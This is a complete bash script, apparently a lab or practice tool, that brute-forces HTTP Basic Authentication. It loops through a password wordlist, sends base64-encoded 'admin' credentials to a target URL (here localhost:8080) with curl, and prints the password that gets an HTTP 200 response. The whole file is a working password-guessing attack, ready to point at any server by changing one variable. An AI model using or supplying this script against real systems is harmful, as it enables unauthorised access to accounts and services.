#!/bin/bash
# brute_http_basic_fixed.sh

URL="http://localhost:8080/"
USER="admin"
WORDLIST="passwords.txt"
TIMEOUT=2
FOUND=false

echo "HTTP Basic Auth Brute Force"
echo "============================"
echo "Target: $URL"
echo "Username: $USER"
echo "Wordlist: $WORDLIST"
echo ""

# Check wordlist
if [ ! -f "$WORDLIST" ]; then
    echo "Error: $WORDLIST not found"
    exit 1
fi

# Check server
if ! curl -s --head "$URL" > /dev/null 2>&1; then
    echo "Error: Server not responding"
    exit 1
fi

# Read wordlist
passwords=()
while IFS= read -r line || [[ -n "$line" ]]; do
    passwords+=("$line")
done < "$WORDLIST"

TOTAL=${#passwords[@]}
echo "Total passwords: $TOTAL"
echo ""

for ((i=0; i<TOTAL; i++)); do
    PASSWORD="${passwords[$i]}"
    echo -n "[$((i+1))/$TOTAL] Testing: '$PASSWORD' ... "
    
    # Create auth header
    AUTH=$(printf "%s:%s" "$USER" "$PASSWORD" | base64 | tr -d '\n')
    
    # Send request
    RESPONSE=$(curl -s \
        -o /dev/null \
        -w "%{http_code}" \
        -H "Authorization: Basic $AUTH" \
        --connect-timeout "$TIMEOUT" \
        "$URL" 2>/dev/null)
    
    if [ "$RESPONSE" = "200" ]; then
        echo "SUCCESS"
        echo ""
        echo "credentials found!"
        echo "username: $USER"
        echo "password: $PASSWORD"
        FOUND=true
        break
    else
        echo "FAILED (HTTP $RESPONSE)"
    fi
done

if [ "$FOUND" = false ]; then
    echo ""
    echo "No valid password found"
fi
